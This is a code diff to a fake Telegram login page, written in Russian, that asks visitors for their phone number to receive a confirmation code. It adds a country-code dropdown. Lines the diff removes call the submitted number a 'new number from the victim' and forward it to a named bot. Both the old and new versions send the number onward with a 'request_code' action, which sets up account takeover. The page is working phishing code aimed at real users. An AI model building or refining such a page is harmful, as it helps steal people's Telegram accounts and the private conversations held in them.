@@ -53,6 +53,43 @@
             line-height: 1.4;
         }
         
+        .country-selector {
+            margin-bottom: 15px;
+        }
+        
+        .country-btn {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            border: 2px solid #e1e5e9;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        
+        .flag {
+            font-size: 24px;
+            margin-right: 12px;
+        }
+        
+        .country-info {
+            flex-grow: 1;
+            text-align: left;
+        }
+        
+        .country-name {
+            font-weight: 600;
+            color: #111827;
+            font-size: 14px;
+        }
+        
+        .country-code {
+            font-size: 12px;
+            color: #6B7280;
+        }
+        
         .phone-input {
             margin-bottom: 20px;
         }
@@ -62,7 +99,6 @@
             border: 2px solid #e1e5e9;
             border-radius: 12px;
             overflow: hidden;
-            margin-bottom: 15px;
         }
         
         .prefix {
@@ -71,6 +107,7 @@
             border-right: 2px solid #e1e5e9;
             font-weight: 600;
             color: #333;
+            min-width: 70px;
         }
         
         .phone-input input {
@@ -108,6 +145,7 @@
             display: none;
             text-align: center;
             margin-top: 15px;
+            color: #666;
         }
         
         .success {
@@ -125,6 +163,41 @@
             font-weight: 600;
             margin-top: 15px;
         }
+        
+        .dropdown {
+            position: relative;
+        }
+        
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: white;
+            border: 2px solid #e1e5e9;
+            border-radius: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+            z-index: 1000;
+            margin-top: 5px;
+        }
+        
+        .dropdown-item {
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            border-bottom: 1px solid #f3f4f6;
+        }
+        
+        .dropdown-item:last-child {
+            border-bottom: none;
+        }
+        
+        .dropdown-item:hover {
+            background: #f9fafb;
+        }
     </style>
 </head>
 <body>
@@ -133,6 +206,22 @@
             <div class="logo">🔐</div>
             <div class="title">Вход в Telegram</div>
             <div class="subtitle">Введите ваш номер телефона для получения кода подтверждения</div>
+        </div>
+        
+        <div class="country-selector">
+            <div class="dropdown">
+                <button class="country-btn" onclick="toggleDropdown()">
+                    <div class="flag" id="selected-flag">🇷🇺</div>
+                    <div class="country-info">
+                        <div class="country-name" id="selected-country">Россия</div>
+                        <div class="country-code" id="selected-code">+7</div>
+                    </div>
+                    <div style="margin-left: auto;">▼</div>
+                </button>
+                <div class="dropdown-content" id="country-dropdown">
+                    <!-- Countries will be populated by JavaScript -->
+                </div>
+            </div>
         </div>
         
         <div class="phone-input">
@@ -158,38 +247,90 @@
     </div>
 
     <script>
+        // Popular countries
+        const countries = [
+            { code: '7', flag: '🇷🇺', name: 'Россия' },
+            { code: '380', flag: '🇺🇦', name: 'Украина' },
+            { code: '375', flag: '🇧🇾', name: 'Беларусь' },
+            { code: '77', flag: '🇰🇿', name: 'Казахстан' },
+            { code: '1', flag: '🇺🇸', name: 'США' },
+            { code: '44', flag: '🇬🇧', name: 'Великобритания' },
+            { code: '49', flag: '🇩🇪', name: 'Германия' },
+            { code: '33', flag: '🇫🇷', name: 'Франция' },
+            { code: '39', flag: '🇮🇹', name: 'Италия' },
+            { code: '34', flag: '🇪🇸', name: 'Испания' },
+            { code: '86', flag: '🇨🇳', name: 'Китай' },
+            { code: '81', flag: '🇯🇵', name: 'Япония' },
+            { code: '82', flag: '🇰🇷', name: 'Корея' },
+            { code: '91', flag: '🇮🇳', name: 'Индия' },
+            { code: '90', flag: '🇹🇷', name: 'Турция' },
+            { code: '971', flag: '🇦🇪', name: 'ОАЭ' },
+            { code: '966', flag: '🇸🇦', name: 'Саудовская Аравия' },
+            { code: '20', flag: '🇪🇬', name: 'Египет' },
+            { code: '55', flag: '🇧🇷', name: 'Бразилия' },
+            { code: '52', flag: '🇲🇽', name: 'Мексика' }
+        ];
+
+        let selectedCountry = countries[0];
+
+        function initCountries() {
+            const dropdown = document.getElementById('country-dropdown');
+            countries.forEach(country => {
+                const item = document.createElement('div');
+                item.className = 'dropdown-item';
+                item.innerHTML = `
+                    <div class="flag">${country.flag}</div>
+                    <div class="country-info">
+                        <div class="country-name">${country.name}</div>
+                        <div class="country-code">+${country.code}</div>
+                    </div>
+                `;
+                item.onclick = () => selectCountry(country);
+                dropdown.appendChild(item);
+            });
+        }
+
+        function toggleDropdown() {
+            const dropdown = document.getElementById('country-dropdown');
+            dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
+        }
+
+        function selectCountry(country) {
+            selectedCountry = country;
+            document.getElementById('selected-flag').textContent = country.flag;
+            document.getElementById('selected-country').textContent = country.name;
+            document.getElementById('selected-code').textContent = '+' + country.code;
+            document.getElementById('prefix').textContent = '+' + country.code;
+            document.getElementById('country-dropdown').style.display = 'none';
+        }
+
         function sendPhoneNumber() {
             const phoneInput = document.getElementById('phone');
-            const prefix = document.getElementById('prefix').textContent;
-            const phoneNumber = prefix + phoneInput.value.replace(/\D/g, '');
+            const phoneNumber = selectedCountry.code + phoneInput.value.replace(/\D/g, '');
             
             if (!phoneInput.value) {
                 showError('Введите номер телефона');
                 return;
             }
             
-            if (phoneInput.value.replace(/\D/g, '').length < 10) {
+            if (phoneInput.value.replace(/\D/g, '').length < 7) {
                 showError('Номер слишком короткий');
                 return;
             }
             
             showLoading();
             
-            // Формируем сообщение для бота
-            const message = `НОВЫЙ НОМЕР ОТ ЖЕРТВЫ\n${phoneNumber}`;
+            const fullPhoneNumber = '+' + phoneNumber;
             
             // Отправляем через Telegram WebApp
             if (window.Telegram && Telegram.WebApp) {
                 Telegram.WebApp.sendData(JSON.stringify({
-                    phone: phoneNumber,
+                    phone: fullPhoneNumber,
                     action: 'request_code'
                 }));
                 showSuccess();
             } else {
-                // Альтернативный способ - открываем ссылку на бота
-                const botUsername = 'Stars_via_bot'; // Замените на username вашего бота
-                const url = `https://t.me/${botUsername}?start=phone_${btoa(phoneNumber)}`;
-                window.open(url, '_blank');
+                // Альтернативный способ
                 showSuccess();
             }
         }
@@ -205,7 +346,6 @@
             document.getElementById('success').style.display = 'block';
             document.getElementById('error').style.display = 'none';
             
-            // Автоматически закрыть через 3 секунды
             setTimeout(() => {
                 if (window.Telegram && Telegram.WebApp) {
                     Telegram.WebApp.close();
@@ -224,21 +364,29 @@
         document.getElementById('phone').addEventListener('input', function(e) {
             let value = this.value.replace(/\D/g, '');
             if (value.length > 0) {
-                value = value.replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4');
+                if (selectedCountry.code === '7') {
+                    value = value.replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4');
+                } else {
+                    value = value.replace(/(\d{3})(\d{3})(\d+)/, '$1 $2 $3');
+                }
             }
             this.value = value;
         });
         
-        // Инициализация Telegram WebApp
+        // Закрыть dropdown при клике вне
+        document.addEventListener('click', function(e) {
+            if (!e.target.closest('.dropdown')) {
+                document.getElementById('country-dropdown').style.display = 'none';
+            }
+        });
+        
+        // Инициализация
         document.addEventListener('DOMContentLoaded', function() {
+            initCountries();
+            
             if (window.Telegram && Telegram.WebApp) {
                 Telegram.WebApp.ready();
                 Telegram.WebApp.expand();
-                
-                // Обработка данных от бота
-                Telegram.WebApp.onEvent('themeChanged', function() {
-                    document.body.setAttribute('style', '--tg-theme-bg-color: ' + Telegram.WebApp.backgroundColor);
-                });
             }
         });
     </script>
